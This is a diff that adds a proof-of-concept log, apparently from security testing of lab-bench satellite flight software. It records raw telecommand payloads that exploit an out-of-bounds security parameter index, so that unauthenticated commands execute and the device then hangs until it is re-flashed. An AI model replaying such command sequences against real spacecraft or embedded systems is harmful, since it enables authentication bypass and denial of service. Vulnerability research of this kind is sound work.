@@ -1,0 +1,65 @@
+[   0.000] ========================================================================
+[   0.000] V-09 unbounded SPI: OOB pass / hang DoS
+[   0.000] ========================================================================
+[   1.519] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.855] --> TC apid=0x0A via=usb AES  payload=00
+[   8.907] <-- TM apid=0x0A clear len=3
+[   8.949] --> TC apid=0x1D via=usb clear payload=0101
+[   9.000] <-- TM apid=0x1D clear len=4
+[   9.000] --> TC apid=0x11 via=usb clear payload=00
+[   9.461] <-- TM apid=0x11 clear len=9
+[   9.461] --> TC apid=0x15 via=usb clear payload=001005
+[   9.912] <-- TM apid=0x15 clear len=6
+[   9.912] --> TC apid=0x0D via=usb clear payload=01
+[  10.372] <-- TM apid=0x0D clear len=4
+[  10.414] --> TC apid=0x1D via=usb clear payload=03
+[  10.465] <-- TM apid=0x1D clear len=4
+[  10.465] <-- TM apid=0x09 clear len=9
+[  10.507] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.559] <-- TM apid=0x1D clear len=4
+[  10.559] --> TC apid=0x10 via=usb clear payload=00
+[  10.610] <-- TM apid=0x10 clear len=4
+[  10.610] --> TC apid=0x21 via=usb clear payload=00
+[  11.072] <-- TM apid=0x21 clear len=6
+[  11.072] --> TC apid=0x24 via=usb clear payload=0000
+[  11.113] <-- TM apid=0x24 clear len=8
+[  11.113] --> TC apid=0x24 via=usb clear payload=0100
+[  11.165] <-- TM apid=0x24 clear len=8
+[  11.165] --> TC apid=0x24 via=usb clear payload=0200
+[  11.216] <-- TM apid=0x24 clear len=8
+[  11.216] --> TC apid=0x24 via=usb clear payload=0300
+[  11.268] <-- TM apid=0x24 clear len=8
+[  11.268] --> TC apid=0x25 via=usb clear payload=0080
+[  11.320] <-- TM apid=0x25 clear len=4
+[  11.320] --> TC apid=0x1E via=usb clear payload=01
+[  11.821] <-- TM apid=0x1E clear len=5
+[  11.821] --> TC apid=0x1D via=usb clear payload=0b
+[  11.924] <-- TM apid=0x1D clear len=4
+[  11.924] --> TC apid=0x05 via=usb clear payload=12
+[  12.383] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.885] <-- TM apid=0x1F clear len=4
+[  12.885] --> TC apid=0x1F via=usb clear payload=05
+[  13.387] <-- TM apid=0x1F clear len=4
+[  13.387] --> TC apid=0x0A via=usb clear payload=01
+[  13.429] <-- TM apid=0x0A AES len=3
+[  21.518] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  29.991] <-- TM apid=0x0E AES len=18
+[  29.991] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.063] --> TC apid=0x15 via=usb AES  payload=011005
+[  30.524] <-- TM apid=0x15 clear len=6
+[  30.975] <-- TM apid=0x01 clear len=9
+[  30.975] SPI=8327 (beyond table): frames back = True -> OOB entry read as Clear, command executed
+[  39.453] device silent after SPI fault (usb: no response)
+[  39.453] --> advance(30000 ms)
+[  91.504] --> TC apid=0x01 via=radio AES  payload=-
+[  95.513] --> POWER CYCLE (scratch + SRAM die, flash survives)
+[  95.519] >> bench recovery: re-flashing the lab image via BOOTSEL
+[ 110.265] --> REARM (bench parity: post-POWERCYCLE)
+[ 110.368] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[ 118.848] <-- TM apid=0x0E AES len=18
+[ 118.849] --> TC apid=0x01 via=radio AES  payload=-
+[ 118.912] <-- TM apid=0x01 AES len=5
+[ 118.912] -- console tail: [TC - SPP] APID=0x001 SEQ=1 LEN=38 FLAGS=1 SEC_HDR=YES | [INFO] USB Device configured successfully | [INFO] ACC OK | [INFO] BME OK | [INFO] GPS UART configured at 9600 baud | [INFO] Radio 0 Configured Successfully! | [INFO] Radio 1 Configured Successfully! | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [WARN] GPS not detected on UART, using zero-coordinate fallback | [TC - SPP] APID=0x027 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x014 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x001 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO
+[ 118.912] ========================================================================
+[ 118.912] POC OK
+[ 118.912] ========================================================================
